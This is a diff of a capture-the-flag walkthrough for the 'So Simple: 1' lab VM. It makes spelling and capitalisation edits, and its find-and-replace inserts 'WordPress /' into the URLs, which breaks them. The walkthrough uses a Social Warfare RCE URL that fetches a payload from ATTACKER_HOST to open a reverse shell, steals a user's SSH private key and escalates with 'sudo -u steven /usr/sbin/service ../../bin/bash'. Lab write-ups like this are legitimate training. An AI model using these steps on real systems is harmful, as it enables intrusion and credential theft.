@@ -32,7 +32,7 @@ Objectives:
 
 ### 1. NMAP scan
 
-We'll use an intense scan on the victim vm (192.168.56.111), we can see web and ssh services running, but no aparent vulnerabilities yet.
+We'll use an intense scan on the victim vm (192.168.56.111), we can see web and ssh services running, but no apparent vulnerabilities yet.
 
 ![victim machine nmap scan result](img/01-nmap.png)
 
@@ -52,13 +52,13 @@ And the website code doesn't reveal anything that's useful:
 
 ### 3. Attempting SSH login
 
-Attempting to login with ssh shows it only accepts key authentication, thus ruling out ssh brute force with common passwords, if we want a way in we'll need an alternative
+Attempting to login with ssh shows it only accepts key authentication, thus ruling out ssh brute force with common passwords, if we want a way in, we'll need an alternative
 
 <br>
 
 ### 4. dirb reconeisance
 
-As there is no vulnerability that we can see in plain sight, dirb, will show us what are some sub-directories, and we can see that wordpress is installed:
+As there is no vulnerability that we can see in plain sight, dirb, will show us what are some sub-directories, and we can see that WordPress  is installed:
 
 ![dirb website results](img/04-dirb.png)
 
@@ -66,9 +66,9 @@ As there is no vulnerability that we can see in plain sight, dirb, will show us 
 
 ### 5. WPScan reconeisance
 
-As we saw on the las step wordpress is installed, WPScan will show wordpress, plugins and themes versions, as well as vulnerabilities associated with them, for this we'll need an api key that we can get by creating a free account.
+As we saw on the las step WordPress  is installed, WPScan will show WordPress , plugins and theme versions, as well as vulnerabilities associated with them, for this we'll need an API key that we can get by creating a free account.
 
-And we'll run the command: `sudo wpscan --api-token <API> --url http://192.168.56.111/wordpress/ -e`
+And we'll run the command: `sudo wpscan --api-token <API> --url http://192.168.56.111/WordPress / -e`
 
 ![wpscan result](img/05-wpscanFirst.png)
 
@@ -76,7 +76,7 @@ Here we can see that the plugin "Social Warfare has an RCE vulnerability that is
 
 ![wpscan social warfare RCE](img/06-wpscanSocialWarfare.png)
 
-If we scroll down further we can see the wordpress users that exist, we can see "admin" and "max":
+If we scroll down further, we can see the WordPress  users that exist, we can see "admin" and "max":
 
 ![wpscan users](img/07-wpscanUsers.png)
 
@@ -84,11 +84,11 @@ If we scroll down further we can see the wordpress users that exist, we can see 
 
 ### 6. Prepairing the exploit
 
-We can see that Social Warfare 3.5.0 has a RCE [vulnerability](https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618/). To exploit it we'll need a web server and a payload and a netcat listener to get a reverse shell.
+We can see that Social Warfare 3.5.0 has an RCE [vulnerability](https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618/). To exploit it we'll need a web server and a payload and a netcat listener to get a reverse shell.
 
 - Web server
 
-   We need a web server to serve our payload, this will be apache as it's simple and comes pre-installed on kali, we only need to enable it:
+   We need a web server to serve our payload, this will be apache as it's simple and comes pre-installed on Kali, we only need to enable it:
 
    ![enable apache](img/08-apacheStart.png)
 
@@ -108,7 +108,7 @@ We can see that Social Warfare 3.5.0 has a RCE [vulnerability](https://wpscan.co
 
   ![cat of the payload](img/10-catPayload.png)
 
-  The "ATTACKER_MACHINE" needs to be changed to our kali machine, in my case 192.168.56.1.. and the port needs to match the netcat listener above.
+  The "ATTACKER_MACHINE" needs to be changed to our Kali machine, in my case 192.168.56.1.. And the port needs to match the netcat listener above.
 
 <br>
 
@@ -116,9 +116,9 @@ We can see that Social Warfare 3.5.0 has a RCE [vulnerability](https://wpscan.co
 
 To run the exploit we need to visit the next url on a web browser:
 
-`http://WEBSITE/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://ATTACKER_HOST/payload.txt`
+`http://WEBSITE/WordPress /wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://ATTACKER_HOST/payload.txt`
 
-The "ATTACKER_MACHINE" needs to be changed to our kali machine, in my case 192.168.56.1.. and "VICTIM_MACHINE to our so simple:1 vm, in my case 192.168.56.111
+The "ATTACKER_MACHINE" needs to be changed to our Kali machine, in my case 192.168.56.1.. and "VICTIM_MACHINE to our so simple:1 vm, in my case 192.168.56.111
 
 Here we can see what happens after visiting the URL:
 
@@ -132,7 +132,7 @@ And if we go back to the ncat terminal we can see that it has established the co
 
 ### 8. Getting the SSH Key
 
-If we cd into the .ssh folder of the user "max", we can copy his ssh key, it's called id_rsa, we can use cat to list it and then copy it into a file called "key" on our kali machine.
+If we cd into the .ssh folder of the user "max", we can copy his ssh key, it's called id_rsa, we can use cat to list it and then copy it into a file called "key" on our Kali machine.
 
 ![copying the ssh key of user max](img/13-sshCopyKey.png)
 
@@ -148,7 +148,7 @@ And now we can ssh into the server as user max, add the fingerprint, and we'll h
 
 ### 9. First user flag
 
-Once inside and as user "max", if we ls their home directory we can see "personal.txt" this file is not useful, "this" is a folder with a bunch of subfolders with a little easter-egg and "user.txt" wich is the user flag we're after:
+Once inside,and as user "max", if we ls their home directory we can see "personal.txt" this file is not useful, "this" is a folder with a bunch of subfolders with a little easter-egg and "user.txt" which is the user flag we're after:
 
 ![getting the flag with cat of the file user.txt](img/16-firstFlag.png)
 
@@ -166,7 +166,7 @@ After listing `/etc/passwd` we can see user steven, we can use `/usr/sbin/servic
 
 To change users we would need either the root password or the other user's password, because we have root access to the service command, we can use it to our advantage:
 
-First of all we use sudo permissions to skip the steven login. Then `-u` to say we want to change user and `steven` to indicat to what user. Then `/usr/sbin/service` is the command we will execute, and `../../bin/bash` is the next command to execute, wich happens to be the shell that we want to use.
+First of all, we use sudo permissions to skip the steven login. Then `-u` to say we want to change user and `steven` to indicate to what user. Then `/usr/sbin/service` is the command we will execute, and `../../bin/bash` is the next command to execute, which happens to be the shell that we want to use.
 
 `sudo -u steven /usr/sbin/service ../../bin/bash`
 
@@ -192,7 +192,7 @@ Once again we'll use `sudo -l` to see what service/script we have access as root
 
 ![sudo -l result on user steven](img/21-escalatingtoroot2.png)
 
-We can see that we have access to the file `/opt/tools/server-health.sh`, if try to list the contents of the file we can see it's non existant.
+We can see that we have access to the file `/opt/tools/server-health.sh`, if try to list the contents of the file we can see it's non existent.
 
 So we'll create the folder tools:
 
